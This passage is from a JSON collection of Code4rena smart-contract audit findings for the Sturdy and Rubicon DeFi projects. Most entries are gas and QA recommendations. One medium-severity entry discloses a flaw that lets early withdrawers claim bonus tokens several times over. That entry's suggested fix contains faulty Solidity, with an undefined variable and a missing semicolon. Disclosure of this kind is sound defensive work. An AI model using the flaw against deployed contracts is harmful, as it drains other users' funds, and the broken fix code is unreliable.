      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/135"
    }
  },
  {
    "title": "QA Report",
    "body": "# LOW\n\n### L-01: Outdated compiler version (pragma solidity 0.6.12)\n\nOlder compilers might be susceptible to some bugs.\n\nI recommend changing the solidity version pragma to the latest version to enforce the use of an up-to-date compiler.\n\nA list of known compiler bugs and their severity can be found here: https://etherscan.io/solcbuginfo\n\n### L-02: Unsafe `approve`\n\n[YieldManager.sol#L221](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L221)\n\nThe ERC20.approve() function returns a boolean value indicating success.\nThis parameter needs to be checked for success.\n\nI recommend using OpenZeppelin’s `safeApprove` function that handle the return value check as it was done it the other contracts.\n\n# NON-CRITICAL\n\n### N-01: `safeApprove` has been deprecated\n\n[ConvexCurveLPVault.sol#L158](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L158)\n\n[LidoVault.sol#L102](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L102)\n\nConsider using `safeIncreaseAllowance` and `safeDecreaseAllowance` instead.\n\n[REFERENCE](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a94cf0509f19292c3edd3e102c025c793c241d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L44)",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/130"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA reports (low/non-critical)\n\n**Contest:** Sturdy\n\n**Autor:** Rotcivegaf\n\n**Scope:**\n\n  - [ConvexCurveLPVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol)\n  - [CollateralAdapter.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/CollateralAdapter.sol)\n  - [GeneralVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol)\n  - [LidoVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol)\n  - [YieldManager.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol)\n\n## Non-critical\n\n### [NC-01] Unused function parameter / Unused local variable\n\n**ConvexCurveLPVault.sol, L154**\n```solidity\nfunction _getWithdrawalAmount(address _asset, uint256 _amount)\n                              ^------------^\n```\n**GeneralVault.sol, L136**\n```solidity\nfunction withdrawOnLiquidation(address _asset, uint256 _amount)\n                               ^------------^\n```\n**LidoVault.sol, L91**\n```solidity\nLidoVault.sol:91:19: Warning: Unused local variable.\n      (bool sent, bytes memory data) = LIDO.call{value: msg.value}('');\n                  ^---------------^\n```\n**LidoVault.sol, L109**\n```solidity\nfunction _getWithdrawalAmount(address _asset, uint256 _amount)\n                              ^------------^\n```\n**LidoVault.sol, L140**\n```solidity\n(bool sent, bytes memory data) = address(_to).call{value: receivedETHAmount}('');\n            ^---------------^\n```\n\n### [NC-02] GeneralVault contract to abstract contract\nChange the **GeneralVault** contract to abstract contract to avoid the deploy by mistake and define the functions without implementation:\n  - L153: function `processYield` replace `{}` to `;`\n  - L158: function `pricePerShare` replace `{}` to `;`\n  - L242-L246: function `_depositToYieldPool` replace `{}` to `;`\n  - L251-L255: function `_withdrawFromYieldPool` replace `{}` to `;`\n  - L260-L265: function `_getWithdrawalAmount` replace `{}` to `;`\n\nThe `withdrawOnLiquidation`(L136) function only returns the `_amount` parameter, avoid the implementation to avoid mistakes and that the inherited contract implements it\n\n### [NC-03] Missing documentation\nIn some functions/variables missing documentation:\n - **In CollateralAdapter:** addCollateralAsset\n - **In ConvexCurveLPVault:** processYield, _withdraw, withdrawOnLiquidation\n - **In GeneralVault:** AssetYield, getRevision, _depositYield\n - **In YieldManager:** AssetYield, setExchangeToken, getRevision\n\n### [NC-04]\nIn **GeneralVault**, the `depositCollateral`(L75) function:\n  The `safeApprove` of `_stAsset` should call inside this function and just before `deposit` and no in the `_depositToYieldPool`\n\n```solidity\nfunction depositCollateral(address _asset, uint256 _amount) external payable virtual {\n  // Deposit asset to vault and receive stAsset\n  // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido\n  (address _stAsset, uint256 _stAssetAmount) = _depositToYieldPool(_asset, _amount);\n\n  IERC20(_stAsset).safeApprove(address(_addressesProvider.getLendingPool()), _stAssetAmount);\n  // Deposit stAsset to lendingPool, then user will get aToken of stAsset\n  ILendingPool(_addressesProvider.getLendingPool()).deposit(\n    _stAsset,\n    _stAssetAmount,\n    msg.sender,\n    0\n  );\n\n  emit DepositCollateral(_asset, msg.sender, _amount);\n}\n```\nRemember `import SafeERC20` library and `using SafeERC20 for IERC20;`\n\n### [NC-05] Unused import\nIn **CollateralAdapter**, the `import {ILendingPool} from '../../interfaces/ILendingPool.sol';` is unused\nIn **GeneralVault**, the `import {ILendingPool} from '../../interfaces/ILendingPool.sol';` is unused\nIn **YieldManager**, the `import {IPriceOracleGetter} from '../../interfaces/IPriceOracleGetter.sol';`, `import {ISwapRouter} from '../../interfaces/ISwapRouter.sol';`, `import {TransferHelper} from '../libraries/helpers/TransferHelper.sol';` are unused\n\n\n## Low\n\n### [L-01] `withdrawOnLiquidation` only returns `_amount`\nThe contract **LidoVault** heredit from **GeneralVault** the function `withdrawOnLiquidation` but dont reimplement it, an user can use this function by mistake esperando withdraw a collateral\nImplement it with a revert to avoid mistake calls\n```solidity\n  function withdrawOnLiquidation(address, uint256)\n    external\n    virtual\n    returns (uint256)\n  {\n    revert(<AN ERROR FROM Errors LIBRARY>);\n  }\n```\n\n### [L-02] OPEN TODO\n\n**GeneralVault.sol, L77:** There is an open `TODO` and don't understand what it mean\n\n### [L-03] Comment function\n\n**GeneralVault.sol, L148:** The function `convertOnLiquidation` its commented\n",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/128"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas report\n\n**Contest:** Sturdy\n\n**Autor:** Rotcivegaf\n\n**Scope:**\n\n  - [ConvexCurveLPVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/ConvexCurveLPVault.sol)\n  - [CollateralAdapter.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/CollateralAdapter.sol)\n  - [GeneralVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol)\n  - [LidoVault.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol)\n  - [YieldManager.sol](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol)\n\n### [G-01] Use function parameter\n**ConvexCurveLPVault.sol, L138 L141:** Replace `curveLPToken` to `_asset`, this save the gas to SLOAD\n\n### [G-02] SLOAD gas optimization\n**ConvexCurveLPVault.sol, L44 L45:** cache `IERC20Detailed(_lpToken).symbol())` in a local variable to save gas of storage reads\n\n### [G-03] Make constant the `convexBooster` contract variable\n**ConvexCurveLPVault.sol, L27 L40:** `address public convexBooster;` to `address public constant convexBooster;` and remove the set in `setConfiguration` function\n\n### [G-04] \\<var\\>++ or \\<var\\> += 1 to ++\\<var\\>\nWhen the value of the post-loop increment/decrement is not stored or used in any calculations, the prefix increment/decrement operators (`++<var>`/`--<var>`) cost less gas PER LOOP than the postfix increment/decrement operators (`<var>++`/`<var>--`)\n\nUse `++<var>` rather than `<var>++` to save gas\n\n**In ConvexCurveLPVault.sol, L106**\n**In GeneralVault.sol, L218**\n**In YieldManager.sol, L120, L130, L156**\n\n### [G-05] Sum outside of for\n**In YieldManager.sol, L121:** Move `_offset + i` outside the `for` to consume less gas\n\n```solidity\n_count = _offset + _offset;\n\nfor (uint256 i = _offset; i < _count; i++) {\n  address asset = _assetsList[i];\n  require(asset != address(0), Errors.UL_INVALID_INDEX);\n  uint256 _amount = IERC20Detailed(asset).balanceOf(address(this));\n  _convertAssetToExchangeToken(asset, _amount);\n}\n```\n\n### [G-06] Caching length on for\n**In YieldManager.sol, L130:** Caching the array length is more gas efficient\n```solidity\nuint256 assetYieldsLength = assetYields.length;\n\nfor (uint256 i = 0; i < assetYieldsLength; i++) {\n  ...\n```\n\n### [G-07] Sub outside of for\n**In YieldManager.sol, L158:** Move `length - 1` outside the `for` to consume less gas\n\n```solidity\nuint256 lengthLessOne = length - 1;\n\nfor (uint256 i = 0; i < length; i++) {\n  assetYields[i].asset = assets[i];\n  if (i != lengthLessOne) {\n    // Distribute yieldAmount based on percent of asset volume\n    assetYields[i].amount = _totalYieldAmount.percentMul(\n      volumes[i].mul(PercentageMath.PERCENTAGE_FACTOR).div(totalVolume)\n    );\n    extraYieldAmount = extraYieldAmount.sub(assetYields[i].amount);\n  } else {\n    // without calculation, set remained extra amount\n    assetYields[i].amount = extraYieldAmount;\n  }\n}\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-sturdy-findings",
      "repo": "https://github.com/code-423n4/2022-05-sturdy-findings",
      "url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/127"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**Table of Contents:**\n\n- [Cheap Contract Deployment Through Clones](#cheap-contract-deployment-through-clones)\n- [Boolean comparisons](#boolean-comparisons)\n- [Bytes constants are more efficient than string constants](#bytes-constants-are-more-efficient-than-string-constants)\n- [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n- [Shift Right instead of Dividing by 2](#shift-right-instead-of-dividing-by-2)\n- [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n- [`++i` costs less gas compared to `i++` or `i += 1`](#i-costs-less-gas-compared-to-i-or-i--1)\n- [Upgrade pragma to at least 0.8.4](#upgrade-pragma-to-at-least-084)\n- [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings)\n- [Functions guaranteed to revert when called by normal users can be marked `payable`](#functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable)\n- [10e18 is more gas efficient than 10**18](#10e18-is-more-gas-efficient-than-1018)\n\n## Cheap Contract Deployment Through Clones\n\nSee `@audit` tag:\n\n```solidity\nFile: BathHouse.sol\n424:             TransparentUpgradeableProxy newBathToken\n425:          = new TransparentUpgradeableProxy(\n426:             newBathTokenImplementation,\n427:             proxyManager,\n428:             _initData\n429:         );\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n- <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n- <https://github.com/porter-finance/v1-core/pull/34>\n\n## Boolean comparisons\n\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(directValue)` instead of `if(directValue == true)` and `if(!directValue)` instead of `if(directValue == false)` here:\n\n```solidity\ncontracts/rubiconPools/BathHouse.sol:\n  372:             approvedStrategists[wouldBeStrategist] == true ||\n\ncontracts/rubiconPools/BathToken.sol:\n  228:             IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n```\n\n## Bytes constants are more efficient than string constants\n\nFrom the [Solidity doc]([https://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array](https://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array)):  \n> If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.  \n  \n[Why do Solidity examples use bytes32 type instead of string?]([https://ethereum.stackexchange.com/questions/3795/why-solidity-uses-bytes32-type-instead-of-string](https://ethereum.stackexchange.com/questions/3795/why-solidity-uses-bytes32-type-instead-of-string))  \n> bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can't be returned from a function to a contract).  \n  \nIf data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.  \n\nInstances of `string constant` that can be replaced by `bytes(1..32) constant` :  \n\n```solidity\ncontracts/peripheral_contracts/TokenWithFaucet.sol:\n  16:     string public constant version = \"1\";\n```\n\n## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\ncontracts/RubiconMarket.sol:\n   400:         require(pay_amt > 0);\n   402:         require(buy_amt > 0);\n   985:         require(id > 0);\n  1002:         require(id > 0);\n  1175:         require(_span[pay_gem][buy_gem] > 0);\n\ncontracts/rubiconPools/BathHouse.sol:\n  110          require(_reserveRatio <= 100);\n  111:         require(_reserveRatio > 0);\n  281:         require(rr > 0);\n\ncontracts/rubiconPools/BathPair.sol:\n  332          require(\n  333:             (askNumerator > 0 && askDenominator > 0) ||\n  334:                 (bidNumerator > 0 && bidDenominator > 0),\n  335              \"one order must be non-zero\"\n```\n\nAlso, please enable the Optimizer.\n\n## Shift Right instead of Dividing by 2\n\nA division by 2 can be calculated by shifting one to the right.\n\nWhile the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\nI suggest replacing `/ 2` with `>> 1` here:\n\n```solidity\ncontracts/RubiconMarket.sol:\n  77:         z = add(mul(x, y), WAD / 2) / WAD;\n  81:         z = add(mul(x, y), RAY / 2) / RAY;\n  85:         z = add(mul(x, WAD), y / 2) / y;\n  89:         z = add(mul(x, RAY), y / 2) / y;\n```\n\n## An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop consumes more gas than necessary.\n  \nIn the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:\n\n```solidity\ncontracts/RubiconRouter.sol:\n  169:         for (uint256 i = 0; i < route.length - 1; i++) {\n  227:         for (uint256 i = 0; i < route.length - 1; i++) {\n\ncontracts/rubiconPools/BathPair.sol:\n  311:         for (uint256 index = 0; index < array.length; index++) {\n  582:         for (uint256 index = 0; index < ids.length; index++) {\n\ncontracts/rubiconPools/BathToken.sol:\n  635:             for (uint256 index = 0; index < bonusTokens.length; index++) {\n```\n\n## `++i` costs less gas compared to `i++` or `i += 1`\n\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\nThe same is also true for `i--`.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nAffected code:  \n\n```solidity\ncontracts/RubiconMarket.sol:\n   436:         last_offer_id++;\n  1165:         _span[address(pay_gem)][address(buy_gem)]++;\n  1197:         _span[pay_gem][buy_gem]--;\n\ncontracts/RubiconRouter.sol:\n   85:         for (uint256 index = 0; index < topNOrders; index++) {\n  169:         for (uint256 i = 0; i < route.length - 1; i++) {\n  227:         for (uint256 i = 0; i < route.length - 1; i++) {\n\ncontracts/rubiconPools/BathPair.sol:\n  206:         last_stratTrade_id++;\n  311:         for (uint256 index = 0; index < array.length; index++) {\n  427:         for (uint256 index = 0; index < quantity; index++) {\n  480:         for (uint256 index = 0; index < quantity; index++) {\n  582:         for (uint256 index = 0; index < ids.length; index++) {\n\ncontracts/rubiconPools/BathToken.sol:\n  635:             for (uint256 index = 0; index < bonusTokens.length; index++) {\n```\n\nConsider using `++i` instead of `i++` to increment the value of an uint variable. The same holds true with decrements (`--i` vs `i--`)\n\n## Upgrade pragma to at least 0.8.4\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n- **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n- **Optimizer improvements in packed structs** (>= 0.8.3)\n- **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4\n\n## Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\nperipheral_contracts/BathBuddy.sol:45:            \"VestingWallet: beneficiary is zero address\"\nperipheral_contracts/BathBuddy.sol:96:            \"Caller is not the Bath Token beneficiary of these rewards\"\nperipheral_contracts/ERC20.sol:189:                \"ERC20: transfer amount exceeds allowance\"\nperipheral_contracts/ERC20.sol:244:                \"ERC20: decreased allowance below zero\"\nperipheral_contracts/ERC20.sol:269:        require(sender != address(0), \"ERC20: transfer from the zero address\");\nperipheral_contracts/ERC20.sol:270:        require(recipient != address(0), \"ERC20: transfer to the zero address\");\nperipheral_contracts/ERC20.sol:276:            \"ERC20: transfer amount exceeds balance\"\nperipheral_contracts/ERC20.sol:313:        require(account != address(0), \"ERC20: burn from the zero address\");\nperipheral_contracts/ERC20.sol:319:            \"ERC20: burn amount exceeds balance\"\nperipheral_contracts/ERC20.sol:343:        require(owner != address(0), \"ERC20: approve from the zero address\");\nperipheral_contracts/ERC20.sol:344:        require(spender != address(0), \"ERC20: approve to the zero address\");\nperipheral_contracts/VestingWallet.sol:40:            \"VestingWallet: beneficiary is zero address\"\nproxy/Address.sol:65:            \"Address: unable to send value, recipient may have reverted\"\nproxy/Address.sol:129:                \"Address: low-level call with value failed\"\nproxy/Address.sol:147:            \"Address: insufficient balance for call\"\nproxy/Address.sol:173:                \"Address: low-level static call failed\"\nproxy/Address.sol:188:        require(isContract(target), \"Address: static call to non-contract\");\nproxy/Address.sol:209:                \"Address: low-level delegate call failed\"\nproxy/Address.sol:224:        require(isContract(target), \"Address: delegate call to non-contract\");\nproxy/TransparentUpgradeableProxy.sol:115:            \"TransparentUpgradeableProxy: new admin is the zero address\"\nproxy/TransparentUpgradeableProxy.sol:176:            \"TransparentUpgradeableProxy: admin cannot fallback to proxy target\"\nproxy/UpgradeableProxy.sol:81:            \"UpgradeableProxy: new implementation is not a contract\"\nrubiconPools/BathHouse.sol:145:            \"bathToken already exists for that ERC20\"\nrubiconPools/BathHouse.sol:149:            \"bathToken does not exist for that desiredPairedAsset\"\nrubiconPools/BathHouse.sol:162:            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\nrubiconPools/BathHouse.sol:177:            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\nrubiconPools/BathHouse.sol:399:            \"Cant create bathToken for zero address\"\nrubiconPools/BathHouse.sol:411:            \"no implementation set for bathTokens\"\nrubiconPools/BathHouse.sol:417:            \"initialize(address,address,address)\",\nrubiconPools/BathPair.sol:151:            \"you are not an approved strategist - bathPair\"\nrubiconPools/BathPair.sol:180:            \"Failed to meet asset pool reserve ratio\"\nrubiconPools/BathPair.sol:188:            \"Failed to meet quote pool reserve ratio\"\nrubiconPools/BathPair.sol:318:        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\nrubiconPools/BathPair.sol:572:            \"you are not the strategist that made this order\"\nrubiconPools/BathToken.sol:202:                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\nrubiconPools/BathToken.sol:237:            \"caller is not bathHouse - BathToken.sol\"\nrubiconPools/BathToken.sol:470:        require(_shares == shares, \"did not mint expected share count\");\nrubiconPools/BathToken.sol:512:            \"This implementation does not support non-sender owners from withdrawing user shares\"\nrubiconPools/BathToken.sol:518:            \"You cannot withdraw the amount of assets you expected\"\nrubiconPools/BathToken.sol:549:            \"This implementation does not support non-sender owners from withdrawing user shares\"\nRubiconMarket.sol:306:            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that you can pay the fee\"\nRubiconMarket.sol:310:            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\"\nRubiconMarket.sol:571:        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\nRubiconMarket.sol:574:            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\nRubiconRouter.sol:338:            \"must send as much ETH as max_fill_withFee\"\nRubiconRouter.sol:392:            \"didnt send enough native ETH for WETH offer\"\nRubiconRouter.sol:446:            \"trying to cancel a non WETH order\"\nRubiconRouter.sol:506:            \"must send enough native ETH to pay as weth and account for fee\" \n```\n\nI suggest shortening the revert strings to fit in 32 bytes.\n\n## Functions guaranteed to revert when called by normal users can be marked `payable`\n\nIf a function modifier such as `onlyAdmin` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n## 10e18 is more gas efficient than 10**18\n\n```solidity\ncontracts/RubiconMarket.sol:\n   73:     uint256 constant WAD = 10**18;\n   74:     uint256 constant RAY = 10**27;\n  857:                     pay_amt * 10**9,\n  859:                 ) / 10**9;\n  898:                         buy_amt * 10**9,\n  900:                     ) / 10**9\n  927:                 pay_amt * 10**9,\n  929:             ) / 10**9\n  951:                 buy_amt * 10**9,\n  953:             ) / 10**9\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/452"
    }
  },
  {
    "title": "Early funds withdrawers can get bonus in multiples of vested bonus tokens (e.g. 2-times, 3-times, etc.)",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101\n\n\n# Vulnerability details\n\n\nThe function setBonusToken allows the same BonusToken to be added more than once to the array bonusTokens. \n```\n  function setBonusToken(address newBonusERC20) external onlyBathHouse {\n    bonusTokens.push(newBonusERC20);\n  }\n```\n\n## Impact\nIf that happens, early withdrawers can get Bonus in multiples of what they actually have right to. Late withdrawers, might not get any Bonus due to shortage.\n\n## Proof of Concept\nBathToken.sol, function setBonusToken\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270-L272\n1. function setBonusToken allows the same BonusToken to be added more than once to the array.\n\nBathToken.sol, function distributeBonusTokenRewards\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629\n2. a. As and when distributeBonusTokenRewards is triggered during a withdraw call, the same bonusToken will be released more than once.\n\nBathBuddy.sol, function release\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101\n2. b. The release function is called.\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\n  Add the required validations to avoid duplicate additions of bonus tokens.\n\n```\n  function setBonusToken(address newBonusERC20) external onlyBathHouse {\n    require(newBonusERC20 != address(0), \"invalid_addr\");\n    if (bonusTokens.length > 0) {\n      for (uint256 index = 0; index < bonusTokens.length; index++) {\n        require (token != newBonusERC20, \"token already exists\")\n      }\n    }\n    bonusTokens.push(newBonusERC20);\n  }\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/450"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* Not used anywhere:\n```solidity\n  uint256 private _released;\n  event EtherReleased(uint256 amount);\n```\n\n* static constant name could be initially set in a constant variable:\n```solidity\n  name = \"Rubicon Bath House\";\n```\n\n* In openBathTokenSpawnAndSignal ```address newOne = _createBathToken...``` can be replaced with ```newBathToken = _createBathToken...```\n\n* Would be a bit cheapier to just directly use scrubStrategistTrade(ids[index]) here:\n```solidity\n  uint256 _id = ids[index];\n  scrubStrategistTrade(_id);\n```\n\n* If assign is set to true it will always return afterwards without hiting the last line:\n```solidity\n  bool assigned = false;\n  for (uint256 index = 0; index < array.length; index++) {\n      if (uid == array[index]) {\n          _index = index;\n          assigned = true;\n          return _index;\n      }\n  }\n  require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n```\nThus it would be cheapier to replace this code snippet with something like this:\n```solidity\n  for (uint256 index = 0; index < array.length; index++) {\n      if (uid == array[index]) {\n          return index;\n      }\n  }\n  revert(\"Didnt Find that element in live list, cannot scrub\");\n```\n\n* In placeMarketMakingTrades this will never be true, because if either of these addresses are empty, then underlyingBalance calls will fail:\n```solidity\n  require(\n    bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n    \"tokenToBathToken error\"\n  );\n\n  IBathToken(bathAssetAddress).underlyingBalance()\n  IBathToken(bathQuoteAddress).underlyingBalance()\n```\n\n* No need to check if token exists here, because it will be later checked in _createBathToken:\n```solidity\n  function openBathTokenSpawnAndSignal\n    require(\n    getBathTokenfromAsset(newBathTokenUnderlying) == address(0),\n    \"bathToken already exists for that ERC20\"\n  );\n```\n_createBathToken:\n```solidity\n  // Check that it isn't already logged in the registry\n  require(\n      tokenToBathToken[_underlyingERC20] == address(0),\n      \"bathToken already exists\"\n  );\n```\n\n* function batchMarketMakingTrades has onlyApprovedStrategist(msg.sender) modifier, but this modifier is also applied every time in placeMarketMakingTrades. Consider extracting common functionality into a separate internal function to avoid useless repeated checks. Similarly, with requote and batchRequoteOffers. Also, scrubStrategistTrade and scrubStrategistTrades.\n\n* Results of repeated external calls should be cached, e.g.:\n```IBathHouse(bathHouse).reserveRatio()``` called twice:\n```solidity\n        require(\n            (\n                IBathToken(bathAssetAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingAsset).balanceOf(bathAssetAddress),\n            \"Failed to meet asset pool reserve ratio\"\n        );\n        require(\n            (\n                IBathToken(bathQuoteAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingQuote).balanceOf(bathQuoteAddress),\n            \"Failed to meet quote pool reserve ratio\"\n        );\n```\n```IBathHouse(_bathHouse).getMarket()``` called twice:\n```solidity\n  require(\n      IBathHouse(_bathHouse).getMarket() !=\n          address(0x0000000000000000000000000000000000000000) &&\n          IBathHouse(_bathHouse).initialized(),\n      \"BathHouse not initialized\"\n  );\n  bathHouse = _bathHouse;\n\n  RubiconMarketAddress = IBathHouse(_bathHouse).getMarket();\n```\n\n* Repeated storage access should be cached, e.g.:\n```outOffersByStrategist[_asset][_quote][info.strategist]``` accessed twice:\n```solidity\n  uint256 target = getIndexFromElement(\n    id,\n    outOffersByStrategist[_asset][_quote][info.strategist]\n  );\n  uint256[] storage current = outOffersByStrategist[_asset][_quote][\n    info.strategist\n  ];\n```\n\n* Repeated casting should be cached, e.g.:\n```uint128(pay_amt)``` and ```uint128(buy_amt)``` casted twice:\n```solidity\n  require(uint128(pay_amt) == pay_amt);\n  require(uint128(buy_amt) == buy_amt);\n  \n  emit LogMake(\n    bytes32(id),\n    keccak256(abi.encodePacked(pay_gem, buy_gem)),\n    msg.sender,\n    pay_gem,\n    buy_gem,\n    uint128(pay_amt),\n    uint128(buy_amt),\n    uint64(block.timestamp)\n  );\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/444"
    }
  },
  {
    "title": "QA Report",
